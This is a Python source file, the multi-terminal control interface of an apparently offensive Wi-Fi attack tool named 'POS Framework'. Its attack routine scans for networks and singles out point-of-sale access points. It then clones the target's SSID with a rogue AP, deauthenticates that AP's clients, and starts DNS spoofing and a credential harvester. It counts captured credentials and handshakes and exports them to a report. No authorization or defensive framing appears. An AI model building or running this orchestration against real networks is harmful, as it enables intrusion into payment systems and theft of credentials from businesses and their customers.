#!/usr/bin/env python3
"""
POS Framework - Multi-Terminal Interface
─────────────────────────────────────────
Multi-terminal architecture for real-time attack monitoring and control.

Terminal Layout:
  ┌─────────────────────────┬─────────────────────────────────────────────────┐
  │                         │  RECON TERMINAL                                 │
  │  INFO TERMINAL          │  Live packet capture, APs, Clients discovered   │
  │  Framework status       ├─────────────────────────────────────────────────┤
  │  Targets                │  ATTACK TERMINAL                                │
  │  Metrics                │  Attack progress, targets, credentials captured │
  │  Controls               ├─────────────────────────────────────────────────┤
  │                         │  LOGS TERMINAL                                  │
  │                         │  System logs, warnings, errors                  │
  └─────────────────────────┴─────────────────────────────────────────────────┘
"""

import os
import sys
import time
import json
import threading
import signal
from datetime import datetime
from collections import deque

try:
    import curses
    CURSES_AVAILABLE = True
except ImportError:
    CURSES_AVAILABLE = False

from .config import DB_NAME, CHANNELS_24GHZ, IS_WINDOWS, log
from .database import POSDatabase
from .recon import ReconEngine
from .deauth import DeauthEngine
from .rogueap import RogueAPEngine
from .beacons import KnownBeaconsEngine
from .karma import KARMAEngine
from .mitm import MITMEngine
from .ssl_strip import SSLStripper
from .dns_spoof import DNSSpoofEngine
from .cred_harvester import CredentialHarvester
from .post_attack import PostAttackAnalyzer


class MultiTerminalInterface:
    """Multi-terminal interface for POS framework."""
    
    def __init__(self, monitor_iface, ap_iface, db=None):
        self.monitor_iface = monitor_iface
        self.ap_iface = ap_iface
        self.db = db or POSDatabase()
        
        self.running = False
        self.threads = []
        self.stopped = threading.Event()
        
        # Attack components
        self.recon = None
        self.deauth = None
        self.rogue_ap = None
        self.beacons = None
        self.karma = None
        self.mitm = None
        self.ssl_stripper = None
        self.dns_spoof = None
        self.cred_harvester = None
        
        # Data for terminals
        self.recon_lines = deque(maxlen=200)
        self.attack_lines = deque(maxlen=200)
        self.log_lines = deque(maxlen=200)
        self.targets = []
        self.stats = {}
        
    def _log(self, terminal, message):
        """Log message to specified terminal."""
        timestamp = datetime.now().strftime('%H:%M:%S')
        line = f"[{timestamp}] {message}"
        
        if terminal == "recon":
            self.recon_lines.append(line)
        elif terminal == "attack":
            self.attack_lines.append(line)
        elif terminal == "logs":
            self.log_lines.append(line)
            
    def _monitor_stats(self):
        """Monitor and update statistics."""
        while not self.stopped.is_set():
            time.sleep(5)
            try:
                self.stats = self.db.get_stats()
                
                # Check for new credentials
                creds = self.stats.get('credentials', 0)
                if creds > 0:
                    self._log("attack", f"*** {creds} CREDENTIALS CAPTURED ***")
            except Exception:
                pass

    def _start_attack(self):
        """Start all attack components."""
        self._log("logs", "Initializing attack components...")
        self._log("logs", f"Monitor: {self.monitor_iface} | AP: {self.ap_iface}")
        
        # Phase 1: Recon
        self._log("recon", "Starting passive reconnaissance...")
        self.recon = ReconEngine(self.monitor_iface, self.db, channels=CHANNELS_24GHZ)
        self.recon.enable_verbose()
        
        # Run recon for 30 seconds
        self._log("recon", "Scanning for 30 seconds...")
        try:
            self.recon.start(timeout=30)
            self.recon.stop()
        except Exception as e:
            self._log("logs", f"Recon error: {e}")
            return
            
        self._log("recon", "Recon complete")
        self.stats = self.db.get_stats()
        self._log("recon", f"Found {self.stats.get('access_points', 0)} APs, "
                           f"{self.stats.get('clients', 0)} clients")
        
        # Phase 2: Target selection
        row = self.db.get_strongest_pos_ap()
        if not row:
            row = self.db.get_strongest_ap()
            
        if not row:
            self._log("attack", "No targets found - continuing recon...")
            return
            
        target_bssid = row[0]
        target_ssid = row[1] or "FreeWiFi"
        target_channel = row[2] or 6
        
        self.targets = [{
            'bssid': target_bssid,
            'ssid': target_ssid,
            'channel': target_channel
        }]
        self._log("attack", f"Target: {target_ssid} ({target_bssid}) ch{target_channel}")
        
        # Phase 3: Launch attacks
        try:
            from scapy.all import RandMAC
            rogue_mac = str(RandMAC())
            self.rogue_ap = RogueAPEngine(
                interface=self.ap_iface,
                ssid=target_ssid,
                channel=target_channel,
                db=self.db,
                mac_address=rogue_mac,
            )
            if self.rogue_ap.start():
                self._log("attack", f"Rogue AP active: '{target_ssid}'")
            else:
                self._log("attack", "Rogue AP failed to start")
        except Exception as e:
            self._log("logs", f"Rogue AP error: {e}")
            
        try:
            self.deauth = DeauthEngine(self.monitor_iface)
            clients = self.db.get_clients_for_bssid(target_bssid)
            # get_clients_for_bssid returns [(mac, rssi), ...] tuples - extract MACs
            self.deauth.add_target(target_bssid, set(mac for mac, rssi in clients))
            self.deauth.start()
            self._log("attack", f"Deauth active: {len(clients)} clients targeted")
        except Exception as e:
            self._log("logs", f"Deauth error: {e}")
            
        try:
            self.dns_spoof = DNSSpoofEngine(self.monitor_iface)
            self.dns_spoof.add_common_targets()
            self.dns_spoof.start()
            self._log("attack", "DNS spoofing active")
        except Exception as e:
            self._log("logs", f"DNS spoof error: {e}")
            
        try:
            self.cred_harvester = CredentialHarvester(self.monitor_iface, self.db)
            threading.Thread(target=self.cred_harvester.start, daemon=True).start()
            self._log("attack", "Credential harvester active")
        except Exception as e:
            self._log("logs", f"Harvester error: {e}")
            
        self._log("attack", "═" * 30)
        self._log("attack", "ALL ATTACK MODULES ACTIVE")
        self._log("attack", "═" * 30)
            
    def _draw_screen(self, stdscr):
        """Main screen drawing loop."""
        curses.curs_set(0)
        stdscr.nodelay(True)
        
        # Initialize colors
        curses.start_color()
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_RED, -1)
        curses.init_pair(2, curses.COLOR_GREEN, -1)
        curses.init_pair(3, curses.COLOR_YELLOW, -1)
        curses.init_pair(4, curses.COLOR_CYAN, -1)
        curses.init_pair(5, curses.COLOR_BLUE, -1)
        curses.init_pair(6, curses.COLOR_WHITE, curses.COLOR_RED)
        curses.init_pair(7, curses.COLOR_BLACK, curses.COLOR_GREEN)
        
        while not self.stopped.is_set():
            try:
                key = stdscr.getch()
                
                if key == ord('q') or key == ord('Q'):
                    self._log("logs", "Shutdown requested...")
                    self.stopped.set()
                    break
                elif key == ord('h') or key == ord('H'):
                    self._log("logs", "Controls: [Q]uit [R]estart [S]ave Report [C]lear")
                elif key == ord('r') or key == ord('R'):
                    self._log("logs", "Restarting attack...")
                    self.stopped.set()
                    return True
                elif key == ord('s') or key == ord('S'):
                    self._log("logs", "Generating report...")
                    analyzer = PostAttackAnalyzer(self.db)
                    analyzer.export_credentials()
                    analyzer.export_handshakes()
                    analyzer.generate_report("exports/attack_report.json")
                    self._log("logs", "Report saved to exports/attack_report.json")
                elif key == ord('c') or key == ord('C'):
                    self.recon_lines.clear()
                    self.attack_lines.clear()
                    self.log_lines.clear()
                
                # Get screen dimensions
                height, width = stdscr.getmaxyx()
                
                if height < 20 or width < 60:
                    stdscr.clear()
                    stdscr.addstr(0, 0, "Terminal too small. Resize to at least 60x20.")
                    stdscr.refresh()
                    time.sleep(0.5)
                    continue
                
                stdscr.erase()
                
                # Layout calculations
                info_w = min(38, width // 3)
                main_w = width - info_w - 1
                
                recon_h = max(5, (height - 4) // 3)
                attack_h = max(5, (height - 4) // 3)
                logs_h = max(5, height - 4 - recon_h - attack_h)
                
                # ── Draw Header ──────────────────────────────────────────────
                header = " POS FRAMEWORK v2.1 - MULTI-TERMINAL "
                stdscr.attron(curses.color_pair(6) | curses.A_BOLD)
                stdscr.addstr(0, 0, " " * width)
                stdscr.addstr(0, (width - len(header)) // 2, header)
                stdscr.attroff(curses.color_pair(6) | curses.A_BOLD)
                
                now = datetime.now().strftime("%H:%M:%S")
                try:
                    stdscr.addstr(0, width - len(now) - 2, now, curses.color_pair(6) | curses.A_BOLD)
                except curses.error:
                    pass

                status_str = f" APs:{self.stats.get('access_points', 0)} \u2502 Clients:{self.stats.get('clients', 0)} \u2502 Creds:{self.stats.get('credentials', 0)} \u2502 EAPOL:{self.stats.get('eapol_frames', 0)} "
                stdscr.attron(curses.color_pair(7))
                stdscr.addstr(1, 0, " " * width)
                stdscr.addstr(1, (width - len(status_str)) // 2, status_str)
                stdscr.attroff(curses.color_pair(7))
                
                base_y = 2
                
                # ── Draw Info Terminal (left) ─────────────────────────────────
                self._draw_box(stdscr, base_y, 0, height - base_y - 1, info_w, "INFO", 4)
                self._draw_info_content(stdscr, base_y + 1, 1, height - base_y - 3, info_w - 2)
                
                # ── Draw Recon Terminal (top-right) ───────────────────────────
                self._draw_box(stdscr, base_y, info_w, recon_h, main_w, "RECON", 3)
                self._draw_lines(stdscr, base_y + 1, info_w + 1, recon_h - 2, main_w - 2, self.recon_lines, 3)
                
                # ── Draw Attack Terminal (mid-right) ──────────────────────────
                atk_y = base_y + recon_h
                self._draw_box(stdscr, atk_y, info_w, attack_h, main_w, "ATTACK", 1)
                self._draw_lines(stdscr, atk_y + 1, info_w + 1, attack_h - 2, main_w - 2, self.attack_lines, 1)
                
                # ── Draw Logs Terminal (bottom-right) ─────────────────────────
                log_y = atk_y + attack_h
                self._draw_box(stdscr, log_y, info_w, logs_h, main_w, "LOGS", 5)
                self._draw_lines(stdscr, log_y + 1, info_w + 1, logs_h - 2, main_w - 2, self.log_lines, 5)
                
                # ── Draw Footer ──────────────────────────────────────────────
                footer_y = height - 1
                footer = " [Q]uit \u2502 [H]elp \u2502 [R]estart \u2502 [S]ave Report \u2502 [C]lear "
                stdscr.attron(curses.A_REVERSE)
                try:
                    stdscr.addstr(footer_y, 0, " " * (width - 1))
                    stdscr.addstr(footer_y, (width - len(footer)) // 2, footer)
                except curses.error:
                    pass
                stdscr.attroff(curses.A_REVERSE)
                
                stdscr.refresh()
                time.sleep(0.3)
                
            except curses.error:
                pass
            except KeyboardInterrupt:
                self.stopped.set()
                break
                
        return False
    
    def _draw_box(self, stdscr, y, x, h, w, title, color_pair):
        """Draw a bordered box with title."""
        try:
            # Top border
            stdscr.attron(curses.color_pair(color_pair))
            stdscr.addstr(y, x, "┌" + "─" * (w - 2) + "┐")
            
            # Title
            title_str = f" {title} "
            stdscr.addstr(y, x + 2, title_str, curses.A_BOLD | curses.color_pair(color_pair))
            
            # Side borders
            for i in range(1, h - 1):
                if y + i < curses.LINES - 1:
                    stdscr.addstr(y + i, x, "│")
                    stdscr.addstr(y + i, x + w - 1, "│")
            
            # Bottom border
            if y + h - 1 < curses.LINES - 1:
                stdscr.addstr(y + h - 1, x, "└" + "─" * (w - 2) + "┘")
            
            stdscr.attroff(curses.color_pair(color_pair))
        except curses.error:
            pass
    
    def _draw_lines(self, stdscr, y, x, h, w, lines, color_pair):
        """Draw log lines inside a terminal box."""
        line_list = list(lines)
        start = max(0, len(line_list) - h)
        
        for i, line in enumerate(line_list[start:start + h]):
            try:
                display = line[:w]
                stdscr.addstr(y + i, x, display, curses.color_pair(color_pair))
            except curses.error:
                pass
    
    def _draw_info_content(self, stdscr, y, x, h, w):
        """Draw info terminal content."""
        row = y
        
        try:
            # Status
            stdscr.addstr(row, x + 1, "STATUS:", curses.A_BOLD | curses.color_pair(2))
            row += 1
            if self.running:
                stdscr.addstr(row, x + 2, "● ACTIVE", curses.color_pair(2))
            else:
                stdscr.addstr(row, x + 2, "○ STOPPED", curses.color_pair(1))
            row += 2
            
            # Targets
            stdscr.addstr(row, x + 1, "TARGETS:", curses.A_BOLD | curses.color_pair(3))
            row += 1
            if self.targets:
                for i, t in enumerate(self.targets[:4]):
                    if row >= y + h:
                        break
                    if isinstance(t, dict):
                        line = f" {t.get('ssid', '?')[:15]} ({t.get('bssid', '?')[:17]})"
                    else:
                        line = f" {str(t)[:w-3]}"
                    stdscr.addstr(row, x + 2, line[:w-3], curses.color_pair(3))
                    row += 1
            else:
                stdscr.addstr(row, x + 2, "(scanning...)", curses.color_pair(3))
                row += 1
            row += 1
            
            # Metrics
            if row < y + h - 8:
                stdscr.addstr(row, x + 1, "METRICS:", curses.A_BOLD | curses.color_pair(4))
                row += 1
                metrics = [
                    f" APs:       {self.stats.get('access_points', 0)}",
                    f" POS APs:   {self.stats.get('pos_access_points', 0)}",
                    f" Clients:   {self.stats.get('clients', 0)}",
                    f" POS Cli:   {self.stats.get('pos_clients', 0)}",
                    f" Creds:     {self.stats.get('credentials', 0)}",
                    f" EAPOL:     {self.stats.get('eapol_frames', 0)}",
                    f" Deauths:   {self.stats.get('deauth_events', 0)}",
                ]
                for m in metrics:
                    if row >= y + h:
                        break
                    stdscr.addstr(row, x + 2, m[:w-3], curses.color_pair(4))
                    row += 1
                row += 1
            
            # Active modules
            if row < y + h - 4:
                stdscr.addstr(row, x + 1, "MODULES:", curses.A_BOLD | curses.color_pair(2))
                row += 1
                modules = [
                    ("Recon", self.recon is not None),
                    ("Deauth", self.deauth is not None),
                    ("RogueAP", self.rogue_ap is not None),
                    ("MITM", self.mitm is not None),
                    ("DNSSpoof", self.dns_spoof is not None),
                    ("SSLStrip", self.ssl_stripper is not None),
                    ("Harvester", self.cred_harvester is not None),
                ]
                for name, active in modules:
                    if row >= y + h:
                        break
                    icon = "●" if active else "○"
                    color = 2 if active else 1
                    stdscr.addstr(row, x + 2, f" {icon} {name}", curses.color_pair(color))
                    row += 1
                    
        except curses.error:
            pass
        
    def run(self):
        """Run the multi-terminal interface."""
        self.running = True
        
        # Start attack in background
        attack_thread = threading.Thread(target=self._start_attack, daemon=True)
        attack_thread.start()
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self._monitor_stats, daemon=True)
        self.threads.append(stats_thread)
        stats_thread.start()
        
        if CURSES_AVAILABLE:
            # Run curses UI
            restart = True
            while restart:
                self.stopped.clear()
                self.targets = []
                restart = curses.wrapper(self._draw_screen)
        else:
            # Fallback: plain text terminal UI
            self._run_plain_ui()
            
        self.db.close()
        self.running = False

    def _run_plain_ui(self):
        """Fallback plain-text UI for Windows without curses, with ANSI colors."""
        # ANSI color codes
        RESET = "\033[0m"
        BOLD = "\033[1m"
        DIM = "\033[2m"
        RED = "\033[31m"
        GREEN = "\033[32m"
        YELLOW = "\033[33m"
        CYAN = "\033[36m"
        WHITE = "\033[37m"
        BG_RED = "\033[41m"
        BG_GREEN = "\033[42m"

        print(f"\n{CYAN}{BOLD}\u2554{'═' * 58}\u2557{RESET}")
        print(f"{CYAN}{BOLD}\u2551{' POS FRAMEWORK v2.1 - LIVE MONITOR':^58}\u2551{RESET}")
        print(f"{CYAN}{BOLD}\u255a{'═' * 58}\u255d{RESET}")
        print(f"{DIM} Controls: Ctrl+C to stop{RESET}")
        print(f"{CYAN}{'─' * 60}{RESET}\n")

        try:
            while not self.stopped.is_set():
                time.sleep(3)

                # Clear screen on Windows
                os.system('cls' if IS_WINDOWS else 'clear')

                print(f"{CYAN}{BOLD}\u250c{'─' * 58}\u2510{RESET}")
                print(f"{CYAN}{BOLD}\u2502{' POS FRAMEWORK v2.1 - LIVE MONITOR':^58}\u2502{RESET}")
                print(f"{CYAN}{BOLD}\u2514{'─' * 58}\u2518{RESET}")

                # Status
                if self.running:
                    print(f"\n {GREEN}{BOLD}\u25cf ACTIVE{RESET}")
                else:
                    print(f"\n {RED}\u25cb STOPPED{RESET}")
                print(f" {DIM}Time: {datetime.now().strftime('%H:%M:%S')}{RESET}")

                # Targets
                print(f"\n{CYAN}{'─' * 60}{RESET}")
                print(f" {YELLOW}{BOLD}TARGETS:{RESET}")
                if self.targets:
                    for t in self.targets:
                        if isinstance(t, dict):
                            print(f"   {CYAN}\u25b6{RESET} {t.get('ssid', '?')} ({t.get('bssid', '?')}) ch{t.get('channel', '?')}")
                        else:
                            print(f"   {CYAN}\u25b6{RESET} {t}")
                else:
                    print(f"   {DIM}(scanning...){RESET}")

                # Metrics
                print(f"\n{CYAN}{'─' * 60}{RESET}")
                print(f" {YELLOW}{BOLD}METRICS:{RESET}")
                print(f"   APs:         {GREEN}{self.stats.get('access_points', 0)}{RESET}")
                print(f"   POS APs:     {GREEN}{self.stats.get('pos_access_points', 0)}{RESET}")
                print(f"   Clients:     {CYAN}{self.stats.get('clients', 0)}{RESET}")
                print(f"   POS Clients: {CYAN}{self.stats.get('pos_clients', 0)}{RESET}")
                print(f"   Credentials: {YELLOW}{BOLD}{self.stats.get('credentials', 0)}{RESET}")
                print(f"   EAPOL:       {WHITE}{self.stats.get('eapol_frames', 0)}{RESET}")
                print(f"   Deauths:     {WHITE}{self.stats.get('deauth_events', 0)}{RESET}")

                # Modules
                print(f"\n{CYAN}{'─' * 60}{RESET}")
                print(f" {YELLOW}{BOLD}MODULES:{RESET}")
                modules = [
                    ("Recon", self.recon is not None),
                    ("Deauth", self.deauth is not None),
                    ("RogueAP", self.rogue_ap is not None),
                    ("MITM", self.mitm is not None),
                    ("DNSSpoof", self.dns_spoof is not None),
                    ("SSLStrip", self.ssl_stripper is not None),
                    ("Harvester", self.cred_harvester is not None),
                ]
                for name, active in modules:
                    if active:
                        print(f"   {GREEN}\u25cf{RESET} {name}")
                    else:
                        print(f"   {RED}\u25cb{RESET} {name}")

                # Recent logs
                print(f"\n{CYAN}{'─' * 60}{RESET}")
                print(f" {YELLOW}{BOLD}RECENT ACTIVITY:{RESET}")
                recent = list(self.attack_lines)[-5:] + list(self.recon_lines)[-3:]
                for line in recent[-8:]:
                    print(f"   {DIM}{line}{RESET}")

                print(f"\n{CYAN}{'─' * 60}{RESET}")
                print(f" {DIM}[Ctrl+C to stop]{RESET}")

        except KeyboardInterrupt:
            self.stopped.set()
            print(f"\n\n{YELLOW}Shutting down...{RESET}")

            # Generate report on exit
            try:
                analyzer = PostAttackAnalyzer(self.db)
                analyzer.print_summary()
            except Exception:
                pass


def main():
    """Main entry point."""
    import argparse
    
    parser = argparse.ArgumentParser(
        description="POS Framework - Multi-Terminal Interface",
        epilog="Launches a multi-terminal interface for attack monitoring and control."
    )
    parser.add_argument("-i", "--interface", default="Wi-Fi",
                       help="Monitor interface (default: Wi-Fi)")
    parser.add_argument("-a", "--ap-interface", default="Wi-Fi 2",
                       help="AP interface (default: Wi-Fi 2)")
    parser.add_argument("-d", "--db", default=DB_NAME,
                       help="Database file path")
    parser.add_argument("--list", action="store_true",
                       help="List available interfaces")
                       
    args = parser.parse_args()
    
    if args.list:
        try:
            from scapy.arch.windows import get_windows_if_list
            ifaces = get_windows_if_list()
            print("\nAvailable interfaces:")
            for i, iface in enumerate(ifaces):
                name = iface.get("name", "Unknown")
                desc = iface.get("description", "")
                print(f"  [{i}] {name} - {desc}")
            print()
        except ImportError:
            print("Interface listing not available on this platform")
        sys.exit(0)
    
    print("=" * 60)
    print("POS Framework - Multi-Terminal Interface")
    print("=" * 60)
    print(f"Monitor: {args.interface}")
    print(f"AP:      {args.ap_interface}")
    print(f"DB:      {args.db}")
    print()
    print("Press any key to start...")
    input()
    
    try:
        ui = MultiTerminalInterface(args.interface, args.ap_interface, POSDatabase(args.db))
        ui.run()
    except KeyboardInterrupt:
        print("\nInterrupted")
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()